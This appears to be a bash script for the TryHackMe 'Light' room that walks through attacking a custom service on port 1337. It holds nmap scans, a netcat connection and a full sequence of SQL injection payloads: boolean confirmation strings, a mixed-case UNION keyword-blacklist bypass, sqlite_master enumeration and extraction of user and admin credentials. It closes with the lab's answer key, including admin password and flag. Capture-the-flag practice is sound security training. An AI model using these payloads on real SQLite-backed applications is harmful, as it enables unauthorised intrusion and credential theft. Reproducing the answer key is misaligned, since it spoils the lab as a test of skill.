#!/bin/bash

# Light - Complete command and payload reference
# Run only inside the authorized TryHackMe lab.
# Usage: ./all_tasks.sh [TARGET_IP]

set -u

TARGET_IP="${1:-10.67.142.120}"

# 1. Initial service detection (the version scan may wait on the custom service)
nmap -sV -sC -p 1337 "$TARGET_IP"

# 2. Faster TCP connect scan used to confirm the port
nmap -Pn -n -sT -p 1337 --max-retries 1 "$TARGET_IP"

# 3. Default-script scan documented during the investigation
nmap -sC -p 1337 "$TARGET_IP"

# 4. Connect to the application and submit the values below interactively
nc "$TARGET_IP" 1337

# Baseline username:
# smokey
# Expected password: vYQ5ngPpw8AdUmL

# SQL injection confirmation payloads:
# '
# smokey' OR '1'='1
# smokey' AND '1'='1
# smokey' AND '1'='2

# Blocked conventional UNION/comment payload:
# ' UNION SELECT sqlite_version() --

# Mixed-case blacklist bypass and SQLite fingerprint:
# ' UnIoN SeLeCt sqlite_version() WHERE '1'='1
# Expected result: 3.31.1

# Return the first table name:
# ' UnIoN SeLeCt name FROM sqlite_master WHERE type='table

# Recover the administrative table schema:
# ' UnIoN SeLeCt sql FROM sqlite_master WHERE name='admintable

# Extract the administrator username and password:
# ' UnIoN SeLeCt username || ' : ' || password FROM admintable WHERE '1'='1
# Expected result: TryHackMeAdmin : mamZtAuMlrsEy5bp6q17

# List every table:
# ' UnIoN SeLeCt group_concat(name, ' | ') FROM sqlite_master WHERE type='table
# Expected result: usertable | admintable

# List every catalog object:
# ' UnIoN SeLeCt group_concat(type || ' : ' || name, ' | ') FROM sqlite_master WHERE '1'='1

# Recover the user table schema:
# ' UnIoN SeLeCt sql FROM sqlite_master WHERE name='usertable

# Extract every ordinary user:
# ' UnIoN SeLeCt group_concat(id || ' : ' || username || ' : ' || password, ' | ') FROM usertable WHERE '1'='1

# Extract every administrative record and recover the flag:
# ' UnIoN SeLeCt group_concat(id || ' : ' || username || ' : ' || password, ' | ') FROM admintable WHERE '1'='1

# Validated TryHackMe answers:
# 1. Admin username: TryHackMeAdmin
# 2. Admin password: mamZtAuMlrsEy5bp6q17
# 3. Flag: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
